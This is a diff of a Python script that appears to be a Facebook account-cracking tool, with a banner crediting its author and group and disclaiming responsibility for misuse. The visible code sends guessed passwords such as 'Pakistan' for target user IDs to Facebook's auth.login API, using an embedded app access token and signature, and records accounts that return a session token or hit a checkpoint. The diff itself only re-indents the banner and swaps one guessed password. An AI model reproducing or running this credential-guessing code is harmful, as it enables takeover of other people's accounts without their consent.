@@ -55,14 +55,14 @@ logo = """
 \x1b[1;44m┗━━━┛┗━━━┛┗┛━┗┛┗┛━━━━┗━━━━┛┗━━┛┗━━┛ \x1b[0m
 \x1b[1;55m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \x1b[0m
 \x1b[1;66m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \x1b[0m
-   \x1b[7m Author: 【𐂡߹߬Zҽҽ߹߬𐂡】 \x1b[0m 
+               \x1b[7m Author: 【𐂡߹߬Zҽҽ߹߬𐂡】 \x1b[0m 
 \x1b[1;95m[●]▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[●] \x1b[0m
-\x1b[7mEm Not Responsible Foh Any MissUse 😡 \x1b[0m
-\x1b[7m Owner : ZeeShaan \x1b[0m
-\x1b[7m Group : Defaulers \x1b[0m
-\x1b[7m FBook :FB.Com/Kudiyan.Da.Prince \x1b[0m
-\x1b[7m Insta : Zee_007 \x1b[0m
-\x1b[7mJaani Haseeb GM Adnan 😘 \x1b[0m
+    \x1b[7mEm Not Responsible Foh Any MissUse 😡 \x1b[0m
+    \x1b[7m Owner : ZeeShaan \x1b[0m
+    \x1b[7m Group : Defaulers \x1b[0m
+    \x1b[7m FBook :FB.Com/Kudiyan.Da.Prince \x1b[0m
+    \x1b[7m Insta : Zee_007 \x1b[0m
+    \x1b[7mJaani Haseeb GM Adnan 😘 \x1b[0m
 \x1b[1;95m[●]▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[●] \x1b[0m
 """
 
@@ -438,7 +438,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = '112233'
+													pass6 = 'Pakistan'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
